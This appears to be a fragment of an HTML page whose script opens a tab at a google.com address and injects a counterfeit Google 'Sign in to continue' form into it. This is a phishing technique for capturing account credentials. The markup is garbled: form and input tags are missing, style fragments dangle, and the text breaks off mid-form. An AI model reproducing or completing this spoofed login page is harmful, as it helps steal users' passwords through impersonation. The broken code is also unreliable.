<!DOCTYPE html>
<html lang="en">
<head>

  <script>
function spoofAndInject() {
  const targetTab = window.open(
    "https://www.google.com/csi", "_blank"
  );
  
  if (!targetTab) {
    alert("Popup blocked!");
    return;
  }

  setTimeout(() => {
    try {
      // Cara 1 - innerHTML langsung
      targetTab.document.body.innerHTML = `
        <div style="
          display:flex;
          justify-content:center;
          align-items:center;
          min-height:100vh;
          font-family:Arial,sans-serif;

            padding:40px;

            width:360px;
            text-align:center;
          ">
            <h1 style="color:#4285f4">Google</h1>
            <p style="color:#666">Sign in to continue</p>

                  method="POST">

                            margin:8px 0;border:1px solid #dadce0;
                            border-radius:6px;font-size:16px;
                            box-sizing:border-box;"
                     required>
